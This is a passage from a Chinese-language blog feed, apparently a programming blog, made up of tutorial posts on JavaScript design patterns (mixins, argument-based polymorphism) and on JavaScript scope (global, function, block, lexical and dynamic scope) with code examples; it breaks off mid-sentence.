class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">//从第二个参数起为被继承的对象</span>        len <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//获取参数长度</span>        arg<span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">//缓存参数对象</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arg <span class="token operator">=</span> arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> property <span class="token keyword">in</span> arg<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">[</span>property<span class="token punctuation">]</span> <span class="token operator">=</span> arg<span class="token punctuation">[</span>property<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//测试</span>otherBook<span class="token punctuation">.</span><span class="token function">mix</span><span class="token punctuation">(</span>book1<span class="token punctuation">,</span>book2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>多态，对同一个方法多种调用方式，要对传入的参数做判断以实现多种调用方式，如果我们定义一个add方法，如果不传参数返回10，如果传一个参数返回10+参数，如果传两个参数返回相加的结果</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取参数</span>    <span class="token keyword">var</span> arg <span class="token operator">=</span> arguments<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取参数长度</span>        len <span class="token operator">=</span> arg<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">10</span> <span class="token operator">+</span> arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//测试</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="类形式实现"><a href="#类形式实现" class="headerlink" title="类形式实现"></a>类形式实现</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">zero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">one</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">10</span><span class="token operator">+</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">two</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> num1<span class="token operator">+</span>num2    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//相加共有方法</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>add <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> arg <span class="token operator">=</span> arguments<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取参数长度</span>            len <span class="token operator">=</span> arg<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token function">zero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token function">one</span><span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token function">two</span><span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//测试</span><span class="token keyword">var</span> A <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈JavaScript的作用域</title>
      <link href="2018/11/01/JavaScript-JS%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>2018/11/01/JavaScript-JS%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<ul><li>全局作用域</li><li>函数作用域</li><li>块级作用域</li><li>词法作用域</li><li>动态作用域</li><li>面试题</li></ul><h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>作用域，是指变量的生命周期（一个变量在哪些范围内保持一定值）。</p><blockquote><p>全局变量：</p><p>生命周期将存在于整个程序之内。</p><p>能被程序中任何函数或者方法访问。</p><p>在 JavaScript 内默认是可以被修改的。</p></blockquote><p>全局变量，虽然好用，但是是非常可怕的，这是所有程序员公认的事实。</p><h5 id="显式声明："><a href="#显式声明：" class="headerlink" title="显式声明："></a>显式声明：</h5><p>带有关键字 var 的声明；</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> testFunc <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'just test'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**---------全局变量会挂载到 window 对象上------------**/</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testFunc<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// ƒ () { console.log('just test') }</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testValue<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 123</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>复制代码</code></pre><p><strong>其实，我们写的函数如果不经过封装，也会是全局变量，他的生命周期也就是全局作用域；</strong></p><h5 id="隐式声明："><a href="#隐式声明：" class="headerlink" title="隐式声明："></a>隐式声明：</h5><p>不带有<strong>声明关键字</strong>的变量，JS 会默认帮你声明一个全局变量！！！</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 没有用 var 修饰</span>      <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 124</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 124 &lt;=  挂在了 window全局对象上 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>复制代码</code></pre><p>现在，变量 <code>result</code> 被挂载到 <code>window</code> 对象上了！！！</p><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>函数作用域内，对外是封闭的，从外层的作用域无法直接访问函数内部的作用域！！！</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 报错：ReferenceError: testValue is not defined</span>复制代码</code></pre><h5 id="通过-return-访问函数内部变量："><a href="#通过-return-访问函数内部变量：" class="headerlink" title="通过 return 访问函数内部变量："></a>通过 return 访问函数内部变量：</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> testValue <span class="token operator">+</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token string">'fun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "innerfun"</span>复制代码</code></pre><p>函数就像一个工厂，我们输入一些东西，它在内部加工，然后给我们一个加工产物；</p><h5 id="通过-闭包-访问函数内部变量："><a href="#通过-闭包-访问函数内部变量：" class="headerlink" title="通过 闭包 访问函数内部变量："></a>通过 闭包 访问函数内部变量：</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> rusult <span class="token operator">=</span> testValue <span class="token operator">+</span> value<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">innser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> rusult<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">innser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token string">'fun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "innerfun"</span>复制代码</code></pre><p>关于闭包，我不会在这篇文章过多描述，因为，想要描述闭包，本身需要跟本文章一样的长度；</p><h5 id="立即执行函数："><a href="#立即执行函数：" class="headerlink" title="立即执行函数："></a>立即执行函数：</h5><p>这是个很实用的函数，很多库都用它分离全局作用域，形成一个单独的函数作用域；</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> testFunc <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'just test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// undefined</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// undefined</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>复制代码</code></pre><p>它能够自动执行 <code>(function() { //... })()</code> 里面包裹的内容，能够很好地消除全局变量的影响；</p><h3 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h3><p>在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生；</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 5</span>复制代码</code></pre><p>很明显，用 var 关键字声明的变量，在 <code>for</code> 循环之后仍然被保存这个作用域里；</p><p>这可以说明： <code>for() { }</code>仍然在，全局作用域里，并没有产生像函数作用域一样的封闭效果；</p><p>如果想要实现 <strong>块级作用域</strong> 那么我们需要用 <code>let</code> 关键字声明！！！</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 报错：ReferenceError: i is not defined</span>复制代码</code></pre><p><strong>在 for 循环执行完毕之后 i 变量就被释放了，它已经消失了！！！</strong></p><p>同样能形成块级作用域的还有 <code>const</code> 关键字：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 报错：ReferenceError: a is not defined</span>复制代码</code></pre><p><code>let</code> 和 <code>const</code> 关键字，创建块级作用域的条件是必须有一个 <code>{ }</code> 包裹：</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ......</span>复制代码</code></pre><p>不要小看块级作用域，它能帮你做很多事情，举个栗子：</p><p>举一个面试中常见的例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 5 5 5 5 5</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>复制代码</code></pre><p>这几乎是作用域的必考题目，你会觉得这种结果很奇怪，但是事实就是这么发生了；</p><p>这里的 i 是在全局作用域里面的，只存在 1 个值，等到回调函数执行时，用词法作用域捕获的 i 就只能是 5；</p><p>因为这个循环计算的 i 值在回调函数结束之前就已经执行到 5 了；我们应该如何让它恢复正常呢？？？</p><p><strong>解法1：调用函数，创建函数作用域：</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">abc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 0 1 2 3 4 </span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>复制代码</code></pre><p>这里相当于创建了5个函数作用域来保存，我们的 i 值；</p><p><strong>解法2：采用立即执行函数，创建函数作用域；</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>复制代码</code></pre><p>原理同上，只不过换成了自动执行这个函数罢了，这里保存了 5 次 i 的值；</p><p><strong>解法3：let  创建块级作用域</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>复制代码</code></pre><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p>词法作用域是指一个变量的可见性，及其文本表述的模拟值（《JavaScript函数式编程》）;</p><p>听起来，十分地晦涩，不过将代码拿来分析就非常浅显易懂了；</p><pre class=" language-js"><code class="language-js">testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">afun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'middle'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "middle"</span>  <span class="token keyword">function</span> <span class="token function">innerFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "inner"</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">innerFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">afun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// "outer"</span>复制代码</code></pre><p><strong>当我们要使用声明的变量时：JS引擎总会从最近的一个域，向外层域查找；</strong></p><ul><li><a href="https://user-gold-cdn.xitu.io/2018/3/28/1626ce92a304bc47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" target="_blank" rel="noopener">图示</a></li></ul><p>再举一个一个实际的例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "outer"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>显然，当 JS 引擎查找这个变量时，发现全局的 testValue 离得更近一些，这恰好和 动态作用域 相反；</strong></p><ul><li><a href="https://user-gold-cdn.xitu.io/2018/3/28/1626ce99fad0f0ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" target="_blank" rel="noopener">图示</a></li></ul><p>如上图所示，下面将讲述与 词法作用域相反的动态作用域；</p><h3 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h3><p>在编程中，最容易被低估和滥用的概念就是动态作用域（《JavaScript函数式编程》）。</p><p>在 JavaScript 中的仅存的应用动态作用域的地方：<code>this</code> 引用，所以这是一个大坑！！！！！</p><blockquote><p>动态作用域，作用域是基于调用栈的，而不是代码中的作用域嵌套；</p><p>作用域嵌套，有词法作用域一样的特性，查找变量时，总是寻找最近的作用域；</p></blockquote><p>同样是，词法作用域，例子2，同一份代码，<strong>如果</strong> 是动态作用域：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "inner"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>当然，JavaScript 除了this之外，其他，都是根据词法作用域查找！！！</strong></p><ul><li><a href="https://user-gold-cdn.xitu.io/2018/3/28/1626ce78d69108cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" target="_blank" rel="noopener">图示</a></li></ul><p>为什么要理解动态作用域呢？因为，这能让你更好地学习 <code>this</code> 引用！！！</p><p> 要清楚，JavaScript 实际上没有动态作用域。它拥有词法作用域。就这么简单。但是 <code>this</code> 机制有些像动态作用域。</p><p>关键的差异：词法作用域是编写时的，而动态作用域（和 <code>this</code>）是运行时的。词法作用域关心的是 <em>函数在何处被声明</em>，但是动态作用域关心的是函数 <em>从何处</em> 